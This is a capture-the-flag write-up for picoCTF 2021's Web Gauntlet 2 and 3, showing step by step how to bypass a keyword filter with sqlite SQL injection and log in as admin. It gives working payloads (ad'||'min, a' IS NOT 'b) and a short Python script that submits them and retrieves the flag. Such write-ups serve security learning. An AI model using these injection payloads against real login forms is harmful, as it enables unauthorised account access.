---
layout: post
title:  "Web Gauntlet - Web"
date:   2021-03-30 12:28:05 +0100
categories: writeups
---

```
Challenge: Web Gauntlet 2 & 3
Author: Shotokhan
Description: SQL injection filter bypass
CTF: picoCTF 2021
Category: Web
```

# Writeup
We have a login form, and we need to perform login as admin. <br>
<br> ![welcome_page](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/web_gauntlet_welcome.jpg?raw=true) <br>
The challenge also gives us a /filter.php endpoint to look for filtered expressions: <br>
```Filters: or and true false union like = > < ; -- /* */ admin``` <br>
Filters are the same for both challenge 2nd and 3rd, but in the 3rd one we have a limit of 25 characters. <br>
From the filter list, it's clearly a SQL injection challenge. <br>
Head to Burp Suite, from a few tests we can see that both username and admin are vulnerable to the injection, and filters apply to both of them. <br>
<br> ![filtered](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/web_gauntlet_filtered.jpg?raw=true) <br>
Note that "password" is filtered because "or" is filtered. <br>
We can also see that input length is "combined input length", which of course is much more limiting. <br>
<br> ![input_too_long](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/web_gauntlet_input_too_long.jpg?raw=true) <br>
Although it wasn't specified in 2nd challenge description, we can check that this one has a combined input length limit, too; the limit is of 35 characters. <br>
From the hints, we see that the underlying DB is sqlite; we can also guess it from filters, because there are the filters for sqlite's comments. <br>
At this point, the first idea is to bypass the filter on admin using a string concatenation, which is done with the || operator in sqlite. <br>
Therefore, as user parameter we pass: ```ad'||'min``` <br>
To avoid getting filtered, we send "pass" as password, and we see that the server leaks the SQL query being made in backend: <br>
<br> ![query_leakage](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/web_gauntlet_not_admin_query_leak.jpg?raw=true) <br>
Now that we know the query, we can open a sqlite3 shell with an in-memory database to do some offline tests. <br>
The first thing to do is to create a table. <br>
Since the query is: ```SELECT username, password FROM users WHERE username='username' AND password='pass';``` <br>
We create a table like that: <br>
```CREATE table users (username string, password string);``` <br>
Then, we insert a row with username "admin" and a random password: <br>
```INSERT into users (username,password) values ('admin', 'asndaisndiasdn');``` <br>
At this point we're ready to do offline tests. <br>
Since "union" operator is filtered, we look for other set operators in sqlite documentation, and we find "except": <br>
We use ```ad'||'min' EXCEPT SELECT 0,0 FROM users WHERE '1``` as user and a blank password, building the following query: <br>
```SELECT username, password FROM users WHERE username='ad'||'min' EXCEPT SELECT 0,0 FROM users WHERE '1' AND password='';``` <br>
It works locally, but it has too many characters for both challenges. <br>
What are we doing wrong here is: we can inject on both parameters, but we're trying to bypass the filter injecting on username only. <br>
We can't use operators like OR and AND on password because they're filtered, so let's try to use concatenation again. <br>
We know that the right password is stored in "password" column, and if we did the following: <br>
```SELECT username, password FROM users WHERE username='ad'||'min' AND password=password;``` <br>
It would pass for sure. <br>
To achieve that, we need string concatenation, so we use ```ad'||'min``` as username and ```'||password||'``` as password, building: <br>
```SELECT username, password FROM users WHERE username='ad'||'min' AND password=''||password||'';``` <br>
Again, it works locally but we're very unlucky because the filter on OR also filters passwORd. <br>
At this point, what we can do is to look for some operator which has precedence over AND but that is not filtered. <br>
Operators "IS" and "IS NOT" are good candidates. <br>
Well, we use the same username, and as password we use ```a' IS NOT 'b```, building: <br>
```SELECT username, password FROM users WHERE username='ad'||'min' AND password='a' IS NOT 'b';``` <br>
It works both locally and remotely, with both challenges (we solved both challenges with the same payload!) <br>
<br> ![congrats_you_won](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/web_gauntlet_congrats_you_won.jpg?raw=true) <br>
The last thing to do to get the flag is to visit /filter.php within the same session: <br>
<br> ![flag](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/web_gauntlet_flag.jpg?raw=true) <br>
We thought it was useful to also add a little script to the writeup: <br>
```
import requests


if __name__ == "__main__":
    base_url = "http://mercury.picoctf.net:32946/"
    data = {"user": "ad'||'min", "pass": "a' IS NOT 'b"}
    session = requests.Session()
    r = session.post(base_url + "index.php", data=data)
    if "Congrats" in r.text:
        r = session.get(base_url + "filter.php")
        print(r.text)
```
